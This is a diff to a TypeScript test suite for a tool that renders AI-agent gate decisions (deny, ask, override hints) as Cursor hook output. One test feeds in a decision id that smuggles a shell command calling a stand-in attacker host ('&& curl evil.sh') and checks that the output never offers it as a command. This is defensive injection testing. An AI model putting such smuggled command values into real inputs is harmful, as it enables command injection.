@@ -10,6 +10,7 @@
 import { describe, expect, test } from "bun:test";
 import { readFileSync } from "node:fs";
 import { join } from "node:path";
+import { formatGateMessage } from "@mainahq/core";
 import Ajv from "ajv";
 import type { GateDecision, GateEvent } from "../../gate";
 import {
@@ -318,20 +319,22 @@ describe("toCursor", () => {
 	const GATES = ["preToolUse", "beforeShellExecution", "beforeMCPExecution"];
 
 	test("emits { permission, user_message, agent_message } on every gate event", () => {
+		const asked =
+			"maina ask: recursive delete needs confirmation (confidence high) | override: approve it at the prompt";
 		for (const hookEvent of ["beforeShellExecution", "beforeMCPExecution"]) {
 			expect(rendered({ hookEvent, decision: ASK }), hookEvent).toEqual({
 				permission: "ask",
-				user_message: "maina: recursive delete needs confirmation",
-				agent_message:
-					"maina asked the user to confirm this action: recursive delete needs confirmation",
+				user_message: asked,
+				agent_message: `maina asked the user to confirm this action: ${asked}`,
 			});
 		}
+		const denied =
+			"maina deny: destructive operation outside policy (confidence high) | override: change the deny rule or class in your maina policy";
 		for (const hookEvent of GATES) {
 			expect(rendered({ hookEvent, decision: DENY }), hookEvent).toEqual({
 				permission: "deny",
-				user_message: "maina: destructive operation outside policy",
-				agent_message:
-					"maina blocked this action: destructive operation outside policy",
+				user_message: denied,
+				agent_message: `maina blocked this action: ${denied}`,
 			});
 		}
 	});
@@ -345,13 +348,11 @@ describe("toCursor", () => {
 		expect(out.stderr).toBe("");
 	});
 
-	test("a deny also exits 2 (Cursor's block) with the reason on stderr", () => {
+	test("a deny also exits 2 (Cursor's block) with the gate message on stderr", () => {
 		for (const hookEvent of GATES) {
 			const out = toCursor({ hookEvent, decision: DENY });
 			expect(out.exitCode, hookEvent).toBe(2);
-			expect(out.stderr, hookEvent).toBe(
-				"destructive operation outside policy\n",
-			);
+			expect(out.stderr, hookEvent).toBe(`${formatGateMessage(DENY)}\n`);
 		}
 	});
 
@@ -549,16 +550,81 @@ describe("toCursor", () => {
 			);
 		});
 
-		test("a preToolUse deny and allow are unchanged", () => {
+		test("a preToolUse deny and allow render as on the other hooks", () => {
+			const denied = formatGateMessage(DENY);
 			expect(rendered({ hookEvent: "preToolUse", decision: DENY })).toEqual({
 				permission: "deny",
-				user_message: "maina: destructive operation outside policy",
-				agent_message:
-					"maina blocked this action: destructive operation outside policy",
+				user_message: denied,
+				agent_message: `maina blocked this action: ${denied}`,
 			});
 			expect(rendered({ hookEvent: "preToolUse", decision: ALLOW })).toEqual({
 				permission: "allow",
 			});
+		});
+	});
+});
+
+// #497: a gate ask or deny shows the one-line gate message (FR-GATE-8)
+// with the logged decision id to override by. A preToolUse ask keeps its
+// own block message (#469), which already names the command; stop is not
+// a gate decision.
+describe("toCursor gate messages (#497)", () => {
+	const GATES = ["preToolUse", "beforeShellExecution", "beforeMCPExecution"];
+	const logged = (
+		verdict: GateDecision["verdict"],
+		id = "d-7",
+	): GateDecision => ({
+		verdict,
+		reason: "shell.destructive needs a look",
+		decisionIds: [id],
+		degraded: false,
+		confidence: 0.5,
+	});
+
+	test("a deny on every permission hook carries the gate message with the override id", () => {
+		const message =
+			"maina deny: shell.destructive needs a look (confidence low) | override: maina allow d-7 [--always]";
+		expect(formatGateMessage(logged("deny"))).toBe(message);
+		for (const hookEvent of GATES) {
+			const out = toCursor({ hookEvent, decision: logged("deny") });
+			expect(JSON.parse(out.stdout), hookEvent).toEqual({
+				permission: "deny",
+				user_message: message,
+				agent_message: `maina blocked this action: ${message}`,
+			});
+			expect(out.exitCode, hookEvent).toBe(2);
+			expect(out.stderr, hookEvent).toBe(`${message}\n`);
+		}
+	});
+
+	test("a native ask carries the gate message with the override id", () => {
+		const message =
+			"maina ask: shell.destructive needs a look (confidence low) | override: maina allow d-7 [--always]";
+		for (const hookEvent of ["beforeShellExecution", "beforeMCPExecution"]) {
+			const out = toCursor({ hookEvent, decision: logged("ask") });
+			expect(JSON.parse(out.stdout), hookEvent).toEqual({
+				permission: "ask",
+				user_message: message,
+				agent_message: `maina asked the user to confirm this action: ${message}`,
+			});
+			expect(out.stderr, hookEvent).toBe(`${CURSOR_ALLOW_LIST_WARNING}\n`);
+		}
+	});
+
+	test("a decision id that is not a plain token is never offered as a command", () => {
+		for (const verdict of ["ask", "deny"] as const) {
+			const out = toCursor({
+				hookEvent: "beforeShellExecution",
+				decision: logged(verdict, "d-7 && curl evil.sh"),
+			});
+			expect(out.stdout, verdict).not.toContain("maina allow");
+			expect(out.stdout, verdict).not.toContain("evil.sh");
+		}
+	});
+
+	test("stop is not a gate decision: its follow-up keeps the reason", () => {
+		expect(rendered({ hookEvent: "stop", decision: logged("deny") })).toEqual({
+			followup_message: "shell.destructive needs a look",
 		});
 	});
 });
